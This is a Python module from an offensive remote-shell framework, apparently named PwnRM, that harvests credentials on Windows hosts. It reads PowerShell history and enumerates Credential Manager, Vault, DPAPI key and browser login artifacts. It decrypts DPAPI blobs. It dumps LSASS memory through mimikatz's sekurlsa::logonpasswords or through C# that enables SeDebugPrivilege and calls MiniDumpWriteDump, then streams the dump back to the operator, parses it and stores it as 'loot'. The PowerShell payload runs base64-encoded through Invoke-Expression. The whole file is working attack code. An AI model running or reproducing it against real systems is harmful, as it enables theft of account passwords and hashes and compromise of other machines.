"""Credential artifact reconnaissance and explicit current-user DPAPI unprotect."""

import base64
import os
import secrets
import shutil
import subprocess
from pathlib import PureWindowsPath
from typing import List, Any

from . import BaseModule
from ..core.credential_dump import extract_zip_artifacts, parse_lsass_minidump, zeroize
from ..shell.ui import c, M, BLD
from ..shell.commands import b64str


class CredsModule(BaseModule):
    name = "creds"
    description = "Credential inventory, DPAPI unprotect, and fast in-memory LSASS extraction"
    author = "uziii2208"
    options = {
        "vault": {"desc": "Enumerate Windows Credential Manager and Vault metadata"},
        "dpapi": {"desc": "Enumerate current-user DPAPI master-key files"},
        "decrypt": {"desc": "Unprotect one Base64 DPAPI blob as the current user: decrypt <B64>"},
        "history": {"desc": "Display recent PowerShell console history"},
        "browser": {"desc": "Locate Chrome, Edge and Brave credential database artifacts"},
        "lsa": {"desc": "Extract LSASS credentials in memory with compact-dump fallback"},
        "--lsa-executor": {"desc": "Local x64 credential executor PE for the fast in-memory lsa path"},
        "--lsa-timeout": {"desc": "Timeout in seconds for the in-memory lsa executor (default: 120)"},
        "--lsa-output": {"desc": "Remote temporary path used with lsa; always deleted"},
        "--download": {"desc": "Retain the raw LSASS dump in the local PwnRM loot store"},
    }

    def run(self, shell, args: List[str]) -> Any:
        selected = set()
        decrypt_blob = ""
        lsa_output = ""
        lsa_executor = ""
        lsa_timeout = 120
        retain_download = False
        idx = 0
        while idx < len(args):
            raw_arg = args[idx]
            lowered = raw_arg.lower()
            arg = lowered[2:] if lowered in {"--vault", "--dpapi", "--decrypt", "--history", "--browser", "--lsa"} else lowered
            if arg == "decrypt":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] decrypt requires a Base64 DPAPI blob.")
                    return {"status": "error", "error": "missing DPAPI blob"}
                decrypt_blob = args[idx + 1]
                try:
                    decoded = base64.b64decode(decrypt_blob, validate=True)
                except (ValueError, base64.binascii.Error):
                    decoded = b""
                if not decoded or len(decoded) > 4 * 1024 * 1024:
                    shell.write_warning("  [-] DPAPI input must be valid non-empty Base64 and no larger than 4 MiB decoded.")
                    return {"status": "error", "error": "invalid DPAPI blob"}
                selected.add(arg)
                idx += 2
                continue
            if arg == "--lsa-output":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --lsa-output requires an absolute remote Windows path.")
                    return {"status": "error", "error": "missing LSASS output path"}
                lsa_output = args[idx + 1]
                path = PureWindowsPath(lsa_output)
                if (
                    not path.is_absolute()
                    or len(lsa_output) > 240
                    or any(char in lsa_output for char in "*?\r\n\x00")
                ):
                    shell.write_warning("  [-] --lsa-output must be an absolute remote Windows path without wildcards.")
                    return {"status": "error", "error": "invalid LSASS output path"}
                idx += 2
                continue
            if arg == "--lsa-executor":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --lsa-executor requires a local x64 PE path.")
                    return {"status": "error", "error": "missing LSASS executor path"}
                lsa_executor = args[idx + 1]
                idx += 2
                continue
            if arg == "--lsa-timeout":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --lsa-timeout requires seconds.")
                    return {"status": "error", "error": "missing LSASS executor timeout"}
                try:
                    lsa_timeout = int(args[idx + 1])
                except ValueError:
                    lsa_timeout = -1
                if not 1 <= lsa_timeout <= 3600:
                    shell.write_warning("  [-] --lsa-timeout must be between 1 and 3600 seconds.")
                    return {"status": "error", "error": "invalid LSASS executor timeout"}
                idx += 2
                continue
            if arg == "--download":
                retain_download = True
                idx += 1
                continue
            if arg in {"vault", "dpapi", "history", "browser", "lsa"}:
                selected.add(arg)
                idx += 1
                continue
            shell.write_warning(f"  [-] Unknown credential mode or option: {raw_arg}")
            return {"status": "error", "error": "invalid option"}

        if lsa_output and "lsa" not in selected:
            shell.write_warning("  [-] --lsa-output is only valid together with the lsa mode.")
            return {"status": "error", "error": "LSASS output path without lsa mode"}
        if retain_download and "lsa" not in selected:
            shell.write_warning("  [-] --download is only valid together with the lsa mode.")
            return {"status": "error", "error": "download without lsa mode"}
        if (lsa_executor or lsa_timeout != 120) and "lsa" not in selected:
            shell.write_warning("  [-] --lsa-executor/--lsa-timeout require the lsa mode.")
            return {"status": "error", "error": "LSASS executor option without lsa mode"}

        if not selected:
            selected = {"vault", "dpapi", "history", "browser"}

        if selected == {"lsa"} and not lsa_output and not retain_download:
            explicit_executor = bool(lsa_executor)
            if not lsa_executor:
                candidates = [
                    os.environ.get("PWNRM_LSA_EXECUTOR", ""),
                    shutil.which("mimikatz.exe") or "",
                    "/opt/resources/windows/mimikatz/x64/mimikatz.exe",
                    "/opt/resources/windows/impacket-examples-windows/mimikatz.exe",
                ]
                lsa_executor = next(
                    (candidate for candidate in candidates if candidate and os.path.isfile(candidate)),
                    "",
                )
            if lsa_executor:
                shell.write_info(
                    c(M + BLD, f"  [*] Fast LSASS extraction through in-memory executor: {lsa_executor}")
                )
                forwarded = [
                    "native",
                    "--capture-output",
                    "--timeout",
                    str(lsa_timeout),
                    lsa_executor,
                    "privilege::debug",
                    "sekurlsa::logonpasswords",
                    "exit",
                ]
                fast_result = shell.noconsolation(subprocess.list2cmdline(forwarded))
                if not isinstance(fast_result, dict):
                    fast_result = {"status": "completed"}
                fast_result.update({"selected": ["lsa"], "backend": "memory-executor"})
                if explicit_executor or fast_result.get("status") != "error":
                    return fast_result
                shell.write_warning("Fast in-memory LSASS executor failed; falling back to compact minidump.")

        if "lsa" in selected and not lsa_output:
            try:
                remote_temp = shell._validate_remote_path(
                    shell.run_sync("[System.IO.Path]::GetTempPath()").strip()
                )
                lsa_output = str(
                    PureWindowsPath(remote_temp) /
                    f"pwnrm_lsass_{secrets.token_hex(16)}.dmp"
                )
            except (OSError, ValueError) as exc:
                shell.write_error(f"  [-] Could not resolve a safe remote LSASS staging path: {exc}")
                return {"status": "error", "error": "unsafe LSASS staging path"}

        if "lsa" in selected:
            archive_path = f"{lsa_output}.zip"
            exists = shell.run_sync(
                f"(Test-Path -LiteralPath '{shell._pse(lsa_output)}') -or "
                f"(Test-Path -LiteralPath '{shell._pse(archive_path)}')"
            ).strip().lower() == "true"
            if exists:
                shell.write_error(f"  [-] Refusing to overwrite existing remote path: {lsa_output}")
                return {"status": "error", "error": "LSASS staging path already exists"}

        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning selected credential artifact locations..."))

        ps = r'''
$ErrorActionPreference = 'SilentlyContinue'
$doVault = __DO_VAULT__
$doDpapi = __DO_DPAPI__
$doDecrypt = __DO_DECRYPT__
$doHistory = __DO_HISTORY__
$doBrowser = __DO_BROWSER__
$doLsa = __DO_LSA__
$decryptBlob = '__DECRYPT_BLOB__'
$lsaOutput = '__LSA_OUTPUT__'
$lsaArchive = '__LSA_ARCHIVE__'

Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Credential Artifact Inventory" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

if ($doHistory) {
    Write-Host "[PowerShell History]" -ForegroundColor Yellow
    $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path -LiteralPath $histPath) {
        Write-Host "  [+] FOUND: $histPath" -ForegroundColor Green
        Get-Content -LiteralPath $histPath | Select-Object -Last 15 | ForEach-Object {
            Write-Host "      $_" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [-] No PSReadLine history for the current profile." -ForegroundColor Gray
    }
}

if ($doVault) {
    Write-Host "`n[Credential Manager / Vault Metadata]" -ForegroundColor Yellow
    $cmdkey = cmdkey.exe /list 2>$null
    if ($cmdkey) { $cmdkey | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    $vault = vaultcmd.exe /listcreds:"Windows Credentials" 2>$null
    if ($vault) { $vault | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    if (-not $cmdkey -and -not $vault) {
        Write-Host "  [-] No accessible Credential Manager or Vault metadata." -ForegroundColor Gray
    }
}

if ($doDpapi) {
    Write-Host "`n[Current-user DPAPI Master Keys]" -ForegroundColor Yellow
    $dpapiUser = "$env:APPDATA\Microsoft\Protect"
    if (Test-Path -LiteralPath $dpapiUser) {
        $keys = @(Get-ChildItem -LiteralPath $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer })
        Write-Host "  [+] DPAPI master-key files found: $($keys.Count)" -ForegroundColor Green
        $keys | Select-Object -First 20 | ForEach-Object {
            Write-Host "      - $($_.FullName)" -ForegroundColor Gray
        }
    } else {
        Write-Host "  [-] Current-user DPAPI Protect directory was not found." -ForegroundColor Gray
    }
}

if ($doDecrypt) {
    Write-Host "`n[Current-user DPAPI Unprotect]" -ForegroundColor Yellow
    $dpapiTypeDef = @"
using System;
using System.Runtime.InteropServices;
public class PwnRMCurrentUserDPAPI {
    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB input, IntPtr description,
        IntPtr entropy, IntPtr reserved, IntPtr prompt, int flags, ref DATA_BLOB output);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LocalFree(IntPtr memory);

    public static byte[] Unprotect(byte[] cipher) {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        try {
            input.cbData = cipher.Length;
            input.pbData = Marshal.AllocHGlobal(cipher.Length);
            Marshal.Copy(cipher, 0, input.pbData, cipher.Length);
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                                    IntPtr.Zero, 0, ref output)) {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }
            byte[] plain = new byte[output.cbData];
            Marshal.Copy(output.pbData, plain, 0, output.cbData);
            return plain;
        } finally {
            if (input.pbData != IntPtr.Zero) Marshal.FreeHGlobal(input.pbData);
            if (output.pbData != IntPtr.Zero) LocalFree(output.pbData);
        }
    }
}
"@
    try {
        if (-not ('PwnRMCurrentUserDPAPI' -as [type])) {
            Add-Type -TypeDefinition $dpapiTypeDef -ErrorAction Stop
        }
        $cipher = [Convert]::FromBase64String($decryptBlob)
        $plain = [PwnRMCurrentUserDPAPI]::Unprotect($cipher)
        Write-Host "  [+] Plaintext bytes (Base64): $([Convert]::ToBase64String($plain))" -ForegroundColor Green
        [Array]::Clear($plain, 0, $plain.Length)
        [Array]::Clear($cipher, 0, $cipher.Length)
    } catch {
        Write-Error "DPAPI unprotect failed in the current user context: $($_.Exception.Message)"
    }
}

if ($doBrowser) {
    Write-Host "`n[Browser Credential Artifacts]" -ForegroundColor Yellow
    $relativePaths = @(
        "AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "AppData\Local\Google\Chrome\User Data\Local State",
        "AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "AppData\Local\Microsoft\Edge\User Data\Local State",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
    )
    $found = 0
    foreach ($relative in $relativePaths) {
        $path = Join-Path $env:USERPROFILE $relative
        if (Test-Path -LiteralPath $path) {
            $found++
            Write-Host "  [+] $path" -ForegroundColor Green
        }
    }
    if ($found -eq 0) { Write-Host "  [-] No supported browser artifact was found." -ForegroundColor Gray }
}

if ($doLsa) {
    Write-Host "`n[LSASS Compact Credential Minidump]" -ForegroundColor Yellow
    $dumpPath = $null
    $previousErrorAction = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
    try {
        $dumpPath = if ($lsaOutput) {
            [Environment]::ExpandEnvironmentVariables($lsaOutput)
        } else {
            Join-Path $env:TEMP ("pwnrm_lsass_{0}.dmp" -f [Guid]::NewGuid().ToString('N'))
        }
        $dumpParent = [IO.Path]::GetDirectoryName($dumpPath)
        if (-not $dumpParent -or -not (Test-Path -LiteralPath $dumpParent -PathType Container)) {
            throw "Dump parent directory does not exist: $dumpParent"
        }
        if (Test-Path -LiteralPath $dumpPath) {
            throw "Refusing to overwrite an existing dump: $dumpPath"
        }

        $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
        $miniDumpSource = @"
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;

public static class PwnRMCompactMiniDump {
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll,
        ref TOKEN_PRIVILEGES privileges, uint length, IntPtr previous, IntPtr required);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern IntPtr OpenProcess(uint access, bool inherit, uint processId);
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);
    [DllImport("dbghelp.dll", SetLastError=true)]
    private static extern bool MiniDumpWriteDump(IntPtr process, uint processId, IntPtr file,
        uint dumpType, IntPtr exception, IntPtr userStream, IntPtr callback);

    private static void EnableDebugPrivilege() {
        IntPtr token;
        if (!OpenProcessToken(GetCurrentProcess(), 0x28, out token))
            throw new Win32Exception(Marshal.GetLastWin32Error());
        try {
            LUID luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES {
                PrivilegeCount = 1, Luid = luid, Attributes = 2
            };
            if (!AdjustTokenPrivileges(token, false, ref privileges, 0, IntPtr.Zero, IntPtr.Zero))
                throw new Win32Exception(Marshal.GetLastWin32Error());
        } finally { CloseHandle(token); }
    }

    public static void Dump(uint processId, string path) {
        EnableDebugPrivilege();
        IntPtr process = OpenProcess(0x450, false, processId);
        if (process == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        try {
            using (FileStream output = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None)) {
                // Data/code segments plus private RW/WC pages contain the
                // material pypykatz needs without transferring all LSASS RAM.
                const uint CompactCredentialDump = 0x00002A01;
                if (!MiniDumpWriteDump(process, processId,
                    output.SafeFileHandle.DangerousGetHandle(), CompactCredentialDump,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        } finally { CloseHandle(process); }
    }
}
"@
        if (-not ('PwnRMCompactMiniDump' -as [type])) {
            Add-Type -TypeDefinition $miniDumpSource -ErrorAction Stop
        }
        [PwnRMCompactMiniDump]::Dump([uint32]$lsass.Id, $dumpPath)

        $dump = Get-Item -LiteralPath $dumpPath -ErrorAction Stop
        if ($dump.Length -le 0) {
            throw "MiniDump created an empty file"
        }
        $dumpHash = (Get-FileHash -LiteralPath $dumpPath -Algorithm SHA256 -ErrorAction Stop).Hash
        Write-Host "  [+] LSASS dump staged : $dumpPath" -ForegroundColor Green
        Write-Host "      Size              : $($dump.Length) bytes" -ForegroundColor Gray
        Write-Host "      SHA-256           : $dumpHash" -ForegroundColor Gray
        Add-Type -AssemblyName System.IO.Compression
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $archive = [IO.Compression.ZipFile]::Open($lsaArchive, [IO.Compression.ZipArchiveMode]::Create)
        try {
            [IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
                $archive,
                $dumpPath,
                [IO.Path]::GetFileName($dumpPath),
                [IO.Compression.CompressionLevel]::Fastest
            ) | Out-Null
        } finally {
            $archive.Dispose()
        }
        $archiveSize = (Get-Item -LiteralPath $lsaArchive -ErrorAction Stop).Length
        Remove-Item -LiteralPath $dumpPath -Force -ErrorAction Stop
        Write-Host "  [+] Compressed transfer archive: $archiveSize bytes" -ForegroundColor Green
        Write-Host "  [*] Raw dump removed; PwnRM will stream, parse, and remove the archive." -ForegroundColor Cyan
    } catch {
        $failure = $_.Exception.Message
        if ($dumpPath -and (Test-Path -LiteralPath $dumpPath)) {
            Remove-Item -LiteralPath $dumpPath -Force -ErrorAction SilentlyContinue
        }
        if ($lsaArchive -and (Test-Path -LiteralPath $lsaArchive)) {
            Remove-Item -LiteralPath $lsaArchive -Force -ErrorAction SilentlyContinue
        }
        Write-Error "LSASS dump failed (administrator/SeDebug required; PPL/EDR may block access): $failure" -ErrorAction Continue
    } finally {
        $ErrorActionPreference = $previousErrorAction
    }
}

Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
'''
        replacements = {
            "__DO_VAULT__": "$true" if "vault" in selected else "$false",
            "__DO_DPAPI__": "$true" if "dpapi" in selected else "$false",
            "__DO_DECRYPT__": "$true" if "decrypt" in selected else "$false",
            "__DO_HISTORY__": "$true" if "history" in selected else "$false",
            "__DO_BROWSER__": "$true" if "browser" in selected else "$false",
            "__DO_LSA__": "$true" if "lsa" in selected else "$false",
            "__DECRYPT_BLOB__": decrypt_blob,
            "__LSA_OUTPUT__": lsa_output.replace("'", "''"),
            "__LSA_ARCHIVE__": archive_path.replace("'", "''") if "lsa" in selected else "",
        }
        for marker, value in replacements.items():
            ps = ps.replace(marker, value)

        encoded = b64str(ps.encode("utf-16le"))
        command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        error_count = len(getattr(shell, "last_run_errors", []))
        interrupted = shell.run_with_interrupt(command, shell.write_line)
        if "lsa" not in selected:
            if interrupted:
                return {"status": "interrupted"}
            return {"status": "completed", "selected": sorted(selected)}

        dump_data = None
        archive_data = None
        result = {"status": "interrupted"} if interrupted else {"status": "error"}
        try:
            new_errors = getattr(shell, "last_run_errors", [])[error_count:]
            if interrupted:
                pass
            elif new_errors:
                result = {
                    "status": "error",
                    "error": "; ".join(new_errors),
                    "selected": sorted(selected),
                }
            else:
                shell.write_info(c(M + BLD, "\n  [*] Streaming compressed LSASS dump..."))
                archive_data = shell.read_remote_file(archive_path)
                dump_name = PureWindowsPath(lsa_output).name
                dump_data = extract_zip_artifacts(archive_data, [dump_name])[dump_name]
                records = parse_lsass_minidump(dump_data)
                shell.write_info(c(M + BLD, "\n  [*] Extracted LSASS credential material"))
                if records:
                    for record in records:
                        shell.write_info(f"    {record}")
                else:
                    shell.write_warning("  [-] No printable LSASS credential material was extracted.")

                retained = []
                if retain_download:
                    target = str(getattr(shell, "target_info", {}).get("host", "target"))
                    saved = shell.loot_mgr.store_artifact(
                        target,
                        "dumps",
                        PureWindowsPath(lsa_output).name,
                        dump_data,
                        source_command="!creds lsa --download",
                    )
                    retained.append(saved)
                    shell.write_info(c(M, f"  [+] Retained LSASS dump: {saved}"))
                result = {
                    "status": "completed",
                    "selected": sorted(selected),
                    "records": len(records),
                    "downloaded": retained,
                }
        except Exception as exc:
            shell.write_error(f"  [-] LSASS parsing failed: {exc}")
            result = {
                "status": "error",
                "error": str(exc),
                "selected": sorted(selected),
            }
        finally:
            if dump_data is not None:
                zeroize([dump_data])
            if archive_data is not None:
                zeroize([archive_data])
            try:
                dump_cleaned = shell.delete_remote_path(lsa_output)
                archive_cleaned = shell.delete_remote_path(archive_path)
                cleaned = dump_cleaned and archive_cleaned
            except Exception as exc:
                cleaned = False
                shell.write_error(f"  [-] Remote LSASS cleanup failed: {exc}")
            if not cleaned:
                shell.write_error(
                    f"  [-] Remote LSASS staging still requires cleanup: {lsa_output} and/or {archive_path}"
                )
                result = {
                    "status": "error",
                    "error": "remote LSASS cleanup failed",
                    "path": lsa_output,
                    "selected": sorted(selected),
                }
            else:
                shell.write_info(c(M, f"  [+] Remote LSASS staging removed: {lsa_output} (+ archive)"))
        return result
